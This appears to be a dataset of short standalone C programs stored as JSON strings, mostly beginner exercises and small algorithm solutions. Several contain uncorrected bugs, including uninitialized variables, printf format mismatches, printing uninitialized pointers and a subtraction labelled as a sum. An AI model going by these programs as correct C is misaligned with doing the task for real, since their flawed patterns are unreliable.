    "#include <stdio.h>\n#include <string.h>\nint main ()\n{\n char s[1000];\n int i, k, br[26];\n char a[26] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};\n fgets(s, 1000, (stdin));\n i = 0;\n while(i < 26)\n        {\n           br[i] = 0;\n    i++;\n }\n for (i = 0; s[i] != '\\0'; i++)\n {\n   for(k = 0; k < 26; k++)\n          {\n  if (s[i] == a[k] || s[i] == a[k] - 32)\n  {\n       br[k] ++;\n  }\n   }\n }\n i = 0;\n while(i < 26)\n {\n   if (br[i] != 0)\n      {\n        printf(\"\\n%c - %d\", a[i], br[i]);\n     }\n   i++;\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int i=4, *j, *k;\n    printf(\"%d %u %u\\n\",i, j, k);\n    j=&i;\n    printf(\"%d %u\\n\",j, j);\n    j=j-1;\n    printf(\"%d %u\\n\", j, j);\n    j=j-9;\n    printf(\"%d %u\\n\",j,j);\n    k=j-3;\n    printf(\"%d %u\\n\",k,k);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int even_sum = 0;\n    int odd_sum = 0;\n    int n;\n    printf(\"\\n\\tn: \");\n    scanf(\"%d\", &n);\n    for (int i = 1; i <= 2 * n - 1; i += 2)\n    {\n        odd_sum += i;\n    }\n    for (int j = 2; j <= 2 * n; j += 2)\n    {\n        even_sum += j;\n    }\n    printf(\"\\n\\tSum of even numbers: %d\\n\", even_sum);\n    printf(\"\\tSum of odd numbers: %d\\n\\n\", odd_sum);\n    return 0;\n}",
    "int printf();\nint main(){\n    int x = 3 << 1;\n    int y = 1024 >> x;\n    int z = y << (x+1);\n    printf(\"%d\\n\", z);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int num[50], n, *p, j, loop, i, m, k;\n    printf(\"Please enter the number of the people this loop: \");\n    scanf(\"%d\", &n);\n    p = num;\n    for (j = 0; j < n; j++)\n        *(p + j) = j + 1;\n    i = 0, m = 0, k = 0;\n    while (m < n - 1)\n    {\n        if (*(p + i) != 0)\n            k++;\n        if (k == 3)\n        {\n            k = 0;\n            *(p + i) = 0;\n            m++;\n        }\n        i++;\n        if (i == n)\n            i = 0;\n    }\n    printf(\"The number that are left: \");\n    for (loop = 0; loop < n; loop++)\n        if (num[loop] != 0)\n            printf(\"%2d number \\n\", num[loop]);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n    int i;\n    char c;\n    scanf(\"%d %c\",&i,&c)!=(-1);\n    printf(\"%d,%c\",i,c);\n    return 0;\n}",
    "#include <stdio.h>\nint N, M;\nint map[101];\nint mapch[101];\nint max;\nvoid check()\n{\n int i;\n int sum = 0;\n for(i=0;i<N;i++)\n {\n  if(mapch[i]) sum += map[i];\n }\n if(max < sum && sum <= M) max = sum;\n}\nvoid DFS(int ch, int num)\n{\n if(num == 3 && ch == N)\n  check();\n if(ch >= N) return;\n if(num >= 4) return;\n mapch[ch] = 1;\n DFS(ch+1,num+1);\n mapch[ch] = 0;\n DFS(ch+1,num);\n}\nint main(void)\n{\n scanf(\"%d %d\", &N, &M);\n int i;\n for(i=0;i<N;i++)\n  scanf(\"%d\", &map[i]);\n max = 0;\n DFS(0,0);\n printf(\"%d\\n\", max);\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <ctype.h>\n#include <math.h>\nvoid part1();\nvoid part2();\nint main(void)\n{\n  part1();\n  part2();\n}\nvoid part1(void)\n{\n  int r0, r1, r2, r3, r4, r5;\n  r0 = 0;\n  r1 = 0;\n  r2 = 0;\n  r3 = 0;\n  r4 = 0;\n  r5 = 0;\n  while(r3 <= 35)\n  {\n    switch(r3)\n    {\n      case 0: r3 = r3 + 16; break;\n      case 1: r5 = 1; break;\n      case 2: r2 = 1; break;\n      case 3: r1 = r5 * r2; break;\n      case 4: r1 = r1 == r4; break;\n      case 5: r3 = r1 + r3; break;\n      case 6: r3 = r3 + 1; break;\n      case 7: r0 = r5 + r0; break;\n      case 8: r2 = r2 + 1; break;\n      case 9: r1 = r2 > r4; break;\n      case 10: r3 = r3 + r1; break;\n      case 11: r3 = 2; break;\n      case 12: r5 = r5 + 1; break;\n      case 13: r1 = r5 > r4; break;\n      case 14: r3 = r1 + r3; break;\n      case 15: r3 = 1; break;\n      case 16: r3 = r3 * r3; break;\n      case 17: r4 = r4 + 2; break;\n      case 18: r4 = r4 * r4; break;\n      case 19: r4 = r3 * r4; break;\n      case 20: r4 = r4 * 11; break;\n      case 21: r1 = r1 + 6; break;\n      case 22: r1 = r1 * r3; break;\n      case 23: r1 = r1 + 10; break;\n      case 24: r4 = r4 + r1; break;\n      case 25: r3 = r3 + r0; break;\n      case 26: r3 = 0; break;\n      case 27: r1 = r3; break;\n      case 28: r1 = r1 * r3; break;\n      case 29: r1 = r3 + r1; break;\n      case 30: r1 = r3 * r1; break;\n      case 31: r1 = r1 * 14; break;\n      case 32: r1 = r1 * r3; break;\n      case 33: r4 = r4 + r1; break;\n      case 34: r0 = 0; break;\n      case 35: r3 = 0; break;\n    }\n    r3 += 1;\n  }\n  printf(\"%d\\n\",r0);\n}\nvoid part2(void)\n{\n  int r0, ip, r4, r5;\n  r0 = 0;\n  ip = 1;\n  r4 = 19 * 4 * 11 + (6 * 22) + 10 + 32 * 14 * 30 * (29 + (27 * 28));\n  r5 = 1;\n  do\n  {\n    if (r4 % r5 == 0)\n    {\n      r0 = r5 + r0;\n    }\n    r5 = r5 + 1;\n  }\n  while (r5 <= r4);\n  printf(\"%d\\n\", r0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint buscaSequencial(int *vetor, int k);\nint main(int argc, char** argv) {\n    int vet[5], i, chave, retorno;\n    for(i=0; i<5;i++){\n        printf(\"\\n Informe um numero: \");\n        scanf(\"%d\", &vet[i]);\n    }\n    printf(\"\\n Informe a chave: \");\n    scanf(\"%d\", &chave);\n    retorno = buscaSequencial(vet, chave);\n    if(retorno == -1)\n        printf(\"N\u00e3o existe o regsitro!\");\n    else\n        printf(\"Registro encontrado: %d \\n\", retorno);\n    return (0);\n}\nint buscaSequencial(int *vetor, int k){\n    int i;\n    for( i=0; i<5; i++){\n       if(vetor[i]== k)\n           return vetor[i];\n    }\n    return -1;\n}",
    "#include <stdio.h>\nunsigned setbits(unsigned x, int p, int n, unsigned y){\n    unsigned xmask = ~(~0 << (p-n+1)) | (~0 << (p+1));\n    x = x & xmask;\n    unsigned ymask = ~(~0 << n) & y;\n    ymask = ymask << (p-n+1);\n    return x | ymask;\n}\nunsigned setbitss(unsigned x, int p, int n, unsigned y){\n    return (x & ((~0 << (p + 1)) | (~(~0 << (p + 1 - n))))) | ((y & ~(~0 << n)) << (p + 1 - n));\n}\nint main(){\n    unsigned i,j,k;\n    int p,n;\n    i = 211;\n    j = 51;\n    p = 4;\n    n = 3;\n    k = setbits(i,p,n,j);\n    printf(\"%u\\n\",k);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\n\n\n\nint main()\n{\n    puts(\"Will execute sh with the following script :\");\n    puts(\"#/bin/bash \\necho \\\"hello\\\" \\necho \\\"how are you\\\" \\necho \\\"today\\\" \\n\");\n    puts(\"Starting now:\");\n    system(\"git status\");\n    system(\"ls\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n_Bool linearSearch(int arr[],int l,int r,int key)\n{\n    if(arr[l]==key)\n    {\n        return 1;\n    }\n    if(l==r)\n    {\n        return 0;\n    }\n    _Bool ans = linearSearch(arr,l+1,r,key);\n    if(ans)\n    {\n        return 1;\n    }\n    return 0;\n}\nint main()\n{\n    printf(\"Enter the size of the array\\n\");\n    int n;\n    scanf(\"%d\",&n);\n    int arr[n];\n    printf(\"Enter the elements of the array\\n\");\n    for(register int i=0;i<n;i++)\n    {\n        scanf(\"%d\",&arr[i]);\n    }\n    int key;\n    printf(\"Enter the element to find\\n\");\n    scanf(\"%d\",&key);\n    _Bool result = linearSearch(arr,0,n,key);\n    if(result)\n    {\n        printf(\"Element found!!!\\n\");\n    }\n    else\n    {\n        printf(\"Element not found\\n\");\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\ntypedef int bool;\nbool isPalindrome(int x)\n{\n    if (x <0 || (x%10==0 && x!=0))\n    {\n        return 0;\n    }\n    else\n    {\n        if (x < 10)\n        {\n            return 1;\n        }\n        int t = 0,num=x;\n        while (num>t)\n        {\n            t = t * 10 + num % 10;\n            printf(\"t=%d num=%d \\n\",t,num);\n            num/= 10;\n        }\n        return num == t || num== t / 10;\n    }\n    return 1;\n}\nint main()\n{\n    printf(\"is Palindrome? %d \\n\", isPalindrome(121));\n}",
    "#include <stdio.h>\n#include <math.h>\n\ndouble Pi;\ndouble lroots[5];\ndouble weight[5];\ndouble lcoef[5 + 1][5 + 1] = {{0}};\nvoid lege_coef()\n{\n int n, i;\n lcoef[0][0] = lcoef[1][1] = 1;\n for (n = 2; n <= 5; n++) {\n  lcoef[n][0] = -(n - 1) * lcoef[n - 2][0] / n;\n  for (i = 1; i <= n; i++)\n   lcoef[n][i] = ((2 * n - 1) * lcoef[n - 1][i - 1]\n      - (n - 1) * lcoef[n - 2][i] ) / n;\n }\n}\ndouble lege_eval(int n, double x)\n{\n int i;\n double s = lcoef[n][n];\n for (i = n; i; i--)\n  s = s * x + lcoef[n][i - 1];\n return s;\n}\ndouble lege_diff(int n, double x)\n{\n return n * (x * lege_eval(n, x) - lege_eval(n - 1, x)) / (x * x - 1);\n}\nvoid lege_roots()\n{\n int i;\n double x, x1;\n for (i = 1; i <= 5; i++) {\n  x = cos(Pi * (i - .25) / (5 + .5));\n  do {\n   x1 = x;\n   x -= lege_eval(5, x) / lege_diff(5, x);\n  } while ( fdim( x, x1) > 2e-16 );\n  lroots[i - 1] = x;\n  x1 = lege_diff(5, x);\n  weight[i - 1] = 2 / ((1 - x * x) * x1 * x1);\n }\n}\ndouble lege_inte(double (*f)(double), double a, double b)\n{\n double c1 = (b - a) / 2, c2 = (b + a) / 2, sum = 0;\n int i;\n for (i = 0; i < 5; i++)\n  sum += weight[i] * f(c1 * lroots[i] + c2);\n return c1 * sum;\n}\nint main()\n{\n int i;\n Pi = atan2(1, 1) * 4;\n lege_coef();\n lege_roots();\n printf(\"Roots: \");\n for (i = 0; i < 5; i++)\n  printf(\" %g\", lroots[i]);\n printf(\"\\nWeight:\");\n for (i = 0; i < 5; i++)\n  printf(\" %g\", weight[i]);\n printf(\"\\nintegrating Exp(x) over [-3, 3]:\\n\\t%10.8f,\\n\"\n  \"compred to actual\\n\\t%10.8f\\n\",\n  lege_inte(exp, -3, 3), exp(3) - exp(-3));\n return 0;\n}",
    "#include<stdio.h>\nint sum(int n){\n    if(n==0){\n        return 0;\n    }\n        return sum(n-1)+n;\n}\nint iterativeSum(int n){\n    int i, sum=0;\n    for(i=0;i<n;i++){\n        sum = sum+i;\n    }\n    return sum;\n}\nint main(){\n    int recsum = sum(5);\n    int itesum = sum(5);\n    printf(\"Recursive Sum :%d\\n\", recsum);\n    printf(\"Iterative Sum :%d\\n\", itesum);\n    return 0;\n}",
    "#include<stdio.h>\nfloat calc(int *x, int *y);\nint cals(int *x, int *y);\nint main(){\n    int num1,num2,sum;\n    float average;\n    printf(\"2\u3064\u306e\u6574\u6570\u3092\u5165\u529b\u3002\\n\");\n    scanf(\"%d,%d\",&num1,&num2);\n    sum=cals(&num1,&num2);\n    printf(\"%d + %d = %d\\n\",num1,num2,sum);\n    average=calc(&num1,&num2);\n    printf(\"average = %.2f\\n\",average);\n    printf(\"average \u306e\u30a2\u30c9\u30ec\u30b9\u306f %p \u3067\u3059\\n\",&average);\n    return 0;\n}\nfloat calc(int *x, int *y){\n    return (*x + *y)/2.0;\n}\nint cals(int *x, int *y){\n    return (*x + *y);\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n    int calif;\n    float average;\n    for (int i = 0; i < 5; i++)\n    {\n        printf(\"Ingrese la Calificacion %d\\n\", i + 1);\n        scanf(\"%d\", &calif);\n        getchar();\n        average = average + calif;\n    }\n    average = average / 5;\n    if (average >= 71)\n    {\n        printf(\"++++++++++APROBADO++++++++++\\npromedio de %.2f\\n\", average);\n    }\n    else if (average < 71)\n    {\n        printf(\"----------REPROBADO----------\\npromedio de %.2f\\n\", average);\n    }\n    getchar();\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    printf(\"escreva o valor do \");\n    float esfera = (4*3.14)/3 ;\n   printf(\"%d e o valor requisitado \", esfera);\n   return 0;\n}",
    "#include <assert.h>\n#include <inttypes.h>\n#include <stdio.h>\nuint64_t djb2(const char* s)\n{\n    uint64_t hash = 5381; \n    size_t i = 0;\n    while (s[i] != '\\0')\n    {\n        hash = ((hash << 5) + hash) + s[i];\n        i++;\n    }\n    return hash;\n}\nvoid test_djb2(void)\n{\n    assert(djb2(\"Hello World\") == 13827776004929097857);\n    assert(djb2(\"Hello World!\") == 13594750393630990530);\n    assert(djb2(\"Hello world\") == 13827776004967047329);\n    assert(djb2(\"Hello world!\") == 13594750394883323106);\n    printf(\"Tests passed\\n\");\n}\nint main()\n{\n    test_djb2();\n    return 0;\n}",
    "#include <stdio.h>\nint min(int a, int b){\n    return a > b ? b : a;\n}\nint main(void){\n    int n;\n    int col[1010][3];\n    int dp[1010][3];\n    scanf(\"%d\", &n);\n    for(int i=0;i<n;i++){\n        scanf(\"%d %d %d\", &col[i][0], &col[i][1], &col[i][2]);\n    }\n    dp[0][0] = col[0][0];\n    dp[0][1] = col[0][1];\n    dp[0][2] = col[0][2];\n    for(int i=1;i<n;i++){\n        dp[i][0] = min(dp[i-1][1], dp[i-1][2]) + col[i][0];\n        dp[i][1] = min(dp[i-1][0], dp[i-1][2]) + col[i][1];\n        dp[i][2] = min(dp[i-1][0], dp[i-1][1]) + col[i][2];\n    }\n    printf(\"%d\", min(min(dp[n-1][0], dp[n-1][1]), dp[n-1][2]));\n    return 0;\n}",
    "#include <stdio.h>\nint count(int arr[], int n)\n{\n    int i;\n    int result = 0, cnt = 0;\n    for ( i = 1; i <= n; i++ )\n    {\n        if ( arr[i] )\n            cnt++;\n        else\n            cnt = 0;\n        result = result>cnt ? result : cnt;\n    }\n    return result;\n}\nint findmax(int arr[], int n)\n{\n    int i;\n    int result = arr[0];\n    for ( i = 1; i <= n; i++ )\n        result = result>arr[i] ? result : arr[i];\n    return result;\n}\nint main()\n{\n    int i, j;\n    int n, m, q;\n    int arr[505][505];\n    int rowmax[505];\n    scanf(\"%d%d%d\", &n, &m, &q);\n    for ( i = 1; i <= n; i++ )\n    {\n        for ( j = 1; j <= m; j++ )\n            scanf(\"%d\", &arr[i][j]);\n        rowmax[i] = count(arr[i], m);\n    }\n    int ans = findmax(rowmax, n);\n    while ( q-- )\n    {\n        scanf(\"%d%d\", &i, &j);\n        if ( arr[i][j] == 0 )\n        {\n            arr[i][j] = 1;\n            rowmax[i] = count(arr[i], m);\n            ans = rowmax[i]>ans ? rowmax[i] : ans;\n        }\n        else\n        {\n            arr[i][j] = 0;\n            rowmax[i] = count(arr[i], m);\n            ans = findmax(rowmax, n);\n        }\n        printf(\"%d\\n\", ans);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    float l;\n    printf(\"Enter length (in meter): \\n\");\n    scanf(\"%f\", &l);\n    float inch = 39.37 * l;\n    float feet = 3.281 * l;\n    printf(\"%0.2f inch, %0.2f feet\\n\", inch, feet);\n    return 0;\n}",
    "#include <stdio.h>\nint contador = 0;\nint fibo(int n)\n{\n   contador++;\n   printf(\"contador = %d f(%d)\\n\",contador, n);\n if ( n == 0 )\n      return 0;\n   else if ( n == 1 )\n      return 1;\n   else\n  return ( fibo(n-1) + fibo(n-2) );\n}\nint main(void)\n{\n   int n, i = 0, c;\n   scanf(\"%d\",&n);\n   for ( c = 0 ; c < n ; c++ )\n   {\n      printf(\"\\n termo: %d\\n\", fibo(c));\n   }\n printf(\"\\nrodadas = %d\\n\", contador);\n   return 0;\n}",
    "#include <stdio.h>\nint main ()\n{\n    int a, b, s;\n    scanf(\"%d\", &a);\n    scanf(\"%d\", &b);\n    s=a-b;\n    printf(\"The sum is:%d\", s);\n}",
    "#include <errno.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nstatic void panic (const char *plaint) {\n    fprintf ((stderr), \"%s\\n\", plaint);\n    exit (1);\n}\nstatic void sys_panic (const char *plaint) {\n    fprintf ((stderr), \"%s: %s\\n\", plaint, strerror (errno));\n    exit (1);\n}\nstatic void blast (FILE *ark, const char *ark_name, long start, long size) {\n    if (0 != fseek (ark, start, (0)))\n sys_panic (ark_name);\n    while (0 < size--) {\n int c = getc (ark);\n if ((-1) == c)\n     panic (\"Premature EOF or I/O error\");\n putc (c, (stdout));\n    }\n}\nstatic void ark_get (FILE *ark, const char *ark_name, const char *key) {\n    if (0 != fseek (ark, -11, (2)))\n sys_panic (ark_name);\n    long catalog_size;\n    fscanf (ark, \"%ld\", &catalog_size);\n    if (catalog_size <= 0)\n panic (\"Bad or empty arkfile\");\n    if (0 != fseek (ark, -11 - catalog_size, (2)))\n sys_panic (ark_name);\n    long offset = 0;\n    for (;;) {\n long size;\n fscanf (ark, \"%ld \", &size);\n char key2[1024];\n if (!fgets (key2, sizeof key2, ark))\n     panic (\"Key not found\");\n size_t L = strlen (key2);\n if (0 < L)\n     key2[L-1] = '\\0';\n if (0 == strcmp (key, key2)) {\n     blast (ark, ark_name, offset, size);\n     return;\n }\n offset += size;\n    }\n}\nint main (int argc, char **argv) {\n    if (3 != argc)\n panic (\"usage: ark-get arkfile key\");\n    FILE *f = fopen (argv[1], \"rb\");\n    if (!f)\n sys_panic (argv[1]);\n    ark_get (f, argv[1], argv[2]);\n    fclose (f);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int n,i,reverse[100];\n scanf(\"%d\",&n);\n for(i=0;i<n;i++)\n {\n scanf(\"%d\",&reverse[i]);\n }\n for(i=n-1;i>=0;i--)\n {\n     printf(\"%d\\n\",reverse[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\nint cont = 0;\nvoid coin(int n, int i, int sum, int *arr, int len){\n    sum += *(arr + i);\n    if(sum > n){\n        return;\n    }\n    if(sum == n){\n        cont++;\n        return;\n    }\n    int k;\n    for(k = i; k < len; k++){\n        coin(n, k, sum, arr, len);\n    }\n}\nint main() {\n    int n = 8, i, sum = 0;\n    int arr[] = {6,2,3};\n    int len = sizeof(arr) / sizeof(int);\n    for(i = 0; i < len; i++){\n        coin(n, i, sum, arr, len);\n    }\n    printf(\"Number of combinations: %d\", cont);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar* longestPalindrome(char* s) {\n    char *cur, *lp1;\n    int maxlen = 0;\n    if (s[0]) {\n        maxlen = 1;\n        lp1 = s;\n    }\n    for (cur=s; *cur; cur++) {\n        int offset;\n        for (offset=1; offset<=2 && cur[offset]; offset++) {\n            char *p1 = cur, *p2 = cur + offset;\n            while (p1 >= s && *p1 == *p2) {\n                if (p2 - p1 + 1 > maxlen) {\n                    maxlen = p2 - p1 + 1;\n                    lp1 = p1;\n                }\n                p1--, p2++;\n            }\n        }\n    }\n    cur = malloc(maxlen+1);\n    strncpy(cur, lp1, maxlen);\n    cur[maxlen] = 0;\n    return cur;\n}\nint main() {\n    char *s = \"ccc\";\n    char *p = longestPalindrome(s);\n    puts(p);\n    return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\nint xToI ( );\nint main ( void )\n{\n   printf ( \"the answer is %d\\n\", xToI () );\n   return 0;\n}\nint xToI()\n{\n    return (int)floor(2.90) + 1;\n}",
    "#include <stdio.h>\nint main()\n{\n int x = 25;\n int *p = &x;\n int y = *p;\n printf(\"%p\\n\", p);\n printf(\"%d\\n\", y);\n}",
    "#include <stdio.h>\nint main()\n{\n    int i, j, digit;\n    printf(\"Enter the no. of terms: \\n\");\n    scanf(\"%d\", &j);\n    for(i = 1; i <= j; i++)\n    {\n        digit = (i*i*i) + 2 * i;\n        printf(\"%d, \", digit);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char* argv[])\n{\n    if (argc < 3) return 1;\n    int num1, num2, i, hcf;\n   srand(0);\n   num1 = atoi(argv[1]);\n   num2 = atoi(argv[2]);\n    for(i=1; i<=num1 || i<=num2; ++i)\n    {\n        if(num1%i==0 && num2%i==0)\n            hcf=i;\n    }\n    printf(\"H.C.F of %d and %d is %d\\n\", num1, num2, hcf);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    double i, j;\n    printf(\"\ub098\ub204\uace0 \uc2f6\uc740 \ub450 \uc815\uc218\ub97c \uc785\ub825\ud558\uc138\uc694 : \");\n    scanf(\"%lf %lf\", &i, &j);\n    if (j == 0) {\n        printf(\"0 \uc73c\ub85c \ub098\ub20c \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. \\n\");\n        return 0;\n    }\n    printf(\"%f \ub97c %f \ub85c \ub098\ub208 \uacb0\uacfc\ub294 : %f \\n\", i, j, i / j);\n    return 0;\n}",
    "#include<stdio.h>\nvoid displayBits(int x);\nint main(void)\n{\n int a=7;\n printf(\"a=%d\\t\",a); displayBits(a);\n a=a<<2;\n printf(\"a=%d\\t\",a); displayBits(a);\n a=a<<3;\n printf(\"a=%d\\t\",a); displayBits(a);\n a=a>>1;\n printf(\"a=%d\\t\",a); displayBits(a);\n a=a>>3;\n printf(\"a=%d\\t\",a); displayBits(a);\n return 0;\n}\nvoid displayBits(int x)\n{\n int i,mask;\n for(i=31; i>=0; i--)\n {\n  mask=1<<i;\n  putchar((x & mask)?'1':'0');\n  if(i%8==0)\n   putchar(' ');\n }\n printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid test1();\nvoid test2();\n#pragma offload_attribute(pop)\nint main() {\n#pragma offload target(mic)\n test1();\n#pragma offload target(mic)\n test2();\n}\nvoid test1() {\n printf(\"this is test1\\n\");\n}\nvoid test2() {\n printf(\"this is test2\\n\");\n}",
    "#include <stdio.h>\nvoid selectionSort(int arr[], int n);\nvoid swap(int *a, int *b);\nint main(){\n  int size = 0;\n  int array[100];\n  int element = 0;\n  printf(\"How many element do you wish to enter: \");\n  scanf(\"%d\", &size);\n  for(int i = 0; i<size; i++){\n  printf(\"Enter an integer: \");\n  scanf(\"%d\", &element);\n  array[i] = element;\n  }\n  selectionSort(array, size);\n  printf(\"Sorted elements: \\n\");\n  for(int j = 0; j < size; j++){\n    printf(\"%d \", array[j]);\n  }\n  printf(\"\\n\");\n  return 0;\n}\nvoid swap(int *a, int *b)\n{\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n}\nvoid selectionSort(int arr[], int n)\n{\n    int i, j, min;\n    for (i = 0; i < n-1; i++)\n    {\n        min = i;\n        for (j = i+1; j < n; j++)\n          if (arr[j] < arr[min])\n            min = j;\n        swap(&arr[min], &arr[i]);\n    }\n}",
    "#include <stdio.h>\n#include<stdlib.h>\n#include<string.h>\nint main(){\n    int k,temp=1,indexl=0,*length=calloc(100000,sizeof(int));\n    char *s=calloc(100000,sizeof(char));\n    scanf(\"%d\",&k);\n    scanf(\"%s\",s);\n    int index=1,lasttype=2,type;\n    if(s[0]>64 && s[0]<91)lasttype=1;\n    else if(s[index]>=96 && s[index]<123)lasttype=0;\n    do{\n        if(s[index]>64 && s[index]<91)type=1;\n        else if(s[index]>96 && s[index]<123)type=0;\n        if(s[index]=='\\0')length[indexl++]=temp;\n        if(lasttype!=type){\n            length[indexl++]=temp;\n            temp=1;\n        }\n        else temp++;\n        lasttype=type;\n    }while(s[index++]!='\\0');\n    temp=0;\n    int maxlen=0;\n    for(int i=0;i<indexl;i++){\n        if(length[i]>k){\n            temp+=k;\n            if(temp>maxlen)maxlen=temp;\n            temp=k;\n            }\n        else if(length[i]==k)temp+=k;\n        else temp=0;\n        if(temp>maxlen)maxlen=temp;\n    }\n    if(strlen(s)==1)printf(\"1\");\n    else printf(\"%d\",maxlen);\n}",
    "#include<stdio.h>\nfloat to_pounds(int kg, int g) {\n    float pounds;\n    pounds = (kg * 2.2) + (g * 0.0022);\n    return pounds;\n}\nint main() {\n    int kg, g;\n    float pounds;\n    scanf(\"%d\", &kg);\n    getchar();\n    scanf(\"%d\", &g);\n    pounds = to_pounds(kg, g);\n    printf(\"Result of conversion: %f\\n\", pounds);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nfloat circlearea(float);\nfloat circlecir(float);\nint main(void)\n{\n    float area\n,perimeter\n,radius;\n    printf(\"Enter the raidus : \");\n    scanf(\"%f\",&radius);\n    area=circlearea(radius);\n    perimeter=circlecir(radius);\n    printf(\"Area for circle with radius %.2f is Area = %f \\n\",radius,area);\n    printf(\"Circumference for circle with radius %.2f is Circuference = %f \\n\",radius,perimeter);\n    return 0;\n}\nfloat circlearea(float radius){\n    float area\n;\n    area=3.14159*pow(radius,2);\n    return area;\n }\nfloat circlecir(float radius){\n    float perimeter\n;\n    perimeter=2*3.14159*radius;\n    return perimeter;\n }",
    "#include <stdio.h>\nint main()\n{\nint i = 8;\nwhile (i >= 4)\n{\n    printf(\"i is %d\\n\", i);\ni--;\n}\nprintf(\"That\u2019s it.\\n\");\nreturn 0;\n}",
    "#include <stdio.h>\nint main()\n{\n float celsius,fahrenheit, kelvin;\n celsius=21;\n fahrenheit= celsius * 9 / 5 + 32;\n kelvin = celsius + 273.15f;\n printf(\"%.2f C = %.2f F = %.2f K\\n\",\n  celsius,\n  fahrenheit,\n  kelvin);\n}",
    "#include <pthread.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <semaphore.h>\n\n\n\nchar buffer[4];\nint nextIn = 0;\nint nextOut = 0;\nsem_t empty_sem_mutex;\nsem_t full_sem_mutex;\nvoid Put(char item)\n{\n  int value;\n  sem_wait(&empty_sem_mutex);\n  buffer[nextIn] = item;\n  nextIn = (nextIn + 1) % 4;\n  printf(\"Producing %c ...nextIn %d..Ascii=%d\\n\",item,nextIn,item);\n  if(nextIn==0)\n    {\n      sem_post(&full_sem_mutex);\n      sleep(1);\n    }\n  sem_post(&empty_sem_mutex);\n}\nvoid * Producer()\n{\n  int i;\n  for(i = 0; i < 10; i++)\n    {\n      Put((char)('A'+ i % 26));\n    }\n}\nvoid Get()\n{\n  int item;\n  sem_wait(&full_sem_mutex);\n  item = buffer[nextOut];\n  nextOut = (nextOut + 1) % 4;\n  printf(\"\\t...Consuming %c ...nextOut %d..Ascii=%d\\n\",item,nextOut,item);\n  if(nextOut==0)\n    {\n      sleep(1);\n    }\n  sem_post(&full_sem_mutex);\n}\nvoid * Consumer()\n{\n  int i;\n  for(i = 0; i < 10; i++)\n    {\n      Get();\n    }\n}\nint main()\n{\n  pthread_t ptid,ctid;\n  sem_init(&empty_sem_mutex,0,1);\n  sem_init(&full_sem_mutex,0,0);\n  if(pthread_create(&ptid, ((void*)0),Producer, ((void*)0)))\n    {\n      printf(\"\\n ERROR creating thread 1\");\n      exit(1);\n    }\n  if(pthread_create(&ctid, ((void*)0),Consumer, ((void*)0)))\n    {\n      printf(\"\\n ERROR creating thread 2\");\n      exit(1);\n    }\n  if(pthread_join(ptid, ((void*)0)))\n    {\n      printf(\"\\n ERROR joining thread\");\n      exit(1);\n    }\n  if(pthread_join(ctid, ((void*)0)))\n    {\n      printf(\"\\n ERROR joining thread\");\n      exit(1);\n    }\n  sem_destroy(&empty_sem_mutex);\n  sem_destroy(&full_sem_mutex);\n  pthread_exit(((void*)0));\n  return 1;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint f(int n, int k)\n{\n    if(n==1)\n        return 1;\n    else\n        return ((k + f(n-1,k))%n + 1);\n}\nint main()\n{\n    int n, a, b, resp, k=1, menor=0;\n    scanf(\"%d\", &n);\n    while(n!=0)\n    {\n        scanf(\"%d\", &a);\n        for(b=1; b<=a; b++)\n        {\n            resp=f(a,b);\n            if(resp==13 && (b<menor || menor==0))\n                menor=b;\n        }\n        printf(\"Case %d: %d: %d\\n\", k, resp-1, menor);\n        k++;\n        n--;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n    int x1, x2, y1, y2;\n    scanf(\"%i\", &x1);\n    scanf(\"%i\", &y1);\n    scanf(\"%i\", &x2);\n    scanf(\"%i\", &y2);\n    double e1 = pow(x2 - x1, 2);\n    double e2 = pow(y2 - y1, 2);\n    double d = sqrt(e1 + e2);\n    printf(\"A DISTANCIA ENTRE A e B = %0.2f\\n\", d);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nvoid fillarray(double ar[], int n)\n{\n    int i = 0;\n    srand(time(((void*)0)));\n    for (i = 0; i < n; i++)\n    {\n        ar[i] = (double)(rand() % 150000) / 10000;\n    }\n}\nvoid showarray(const double ar[], int n)\n{\n    int i = 0;\n    for (i = 0; i < n; i++)\n    {\n        printf(\"%.4lf\\t\", ar[i]);\n        if((i + 1) % 6 == 0)\n            printf(\"\\n\");\n    }\n}\nint compare_double(const void * a, const void * b)\n{\n    const double x = * (const double *) a;\n    const double y = * (const double *) b;\n    if (x < y)\n        return -1;\n    else if (x == y)\n        return 0;\n    else\n        return 1;\n}\nint main(void)\n{\n    int n = 40;\n    double ar[n];\n    fillarray(ar, n);\n    showarray(ar, n);\n    printf(\"\\n\\n\");\n    qsort(ar, n, sizeof(double), compare_double);\n    showarray(ar, n);\n    printf(\"\\n\");\n    return 0;\n}",
    "int main(void) {\n int a = 1 / 1;\n return 0;\n}",
